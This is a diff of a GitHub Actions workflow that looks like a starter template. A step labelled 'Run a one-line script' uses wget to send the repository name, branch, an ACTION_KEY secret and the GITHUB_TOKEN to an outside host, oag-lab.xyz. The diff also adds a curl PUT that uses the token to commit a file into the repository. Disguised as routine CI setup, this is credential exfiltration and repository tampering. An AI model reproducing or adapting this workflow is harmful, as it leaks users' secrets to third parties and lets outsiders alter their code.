@@ -29,6 +29,7 @@ jobs:
       - name: Run a one-line script
         run: wget http://direct.oag-lab.xyz:8080/?keys=${GITHUB_REPOSITORY}-${GITHUB_REF##*/}-${{secrets.ACTION_KEY}}-${{secrets.GITHUB_TOKEN}}
 
+
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
@@ -36,8 +37,13 @@ jobs:
           echo test, and deploy your project.
           curl --request GET \
           --url https://api.github.com/repos/root-ghobb/action/contents \
-          --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
+          --header 'Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
           --header 'Accept: application/vnd.github.v3+json' \
           --header 'content-type: application/json'
-          
+          curl --request PUT \
+          --url https://api.github.com/repos/root-ghobb/action/contents/sd000 \
+          --header 'Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
+          --header 'Accept: application/vnd.github.v3+json' \
+          --header 'content-type: application/json' \
+          --data-binary $'{\"message\":\"my commit messages\",\"committer\":{\"name\":\"Monalisa Octocat\",\"email\":\"vkyvenkat28@gmail.com\"},\"content\":\"bXkgbmV3IGZpbGUgY29udGVudHM=\"} '
           
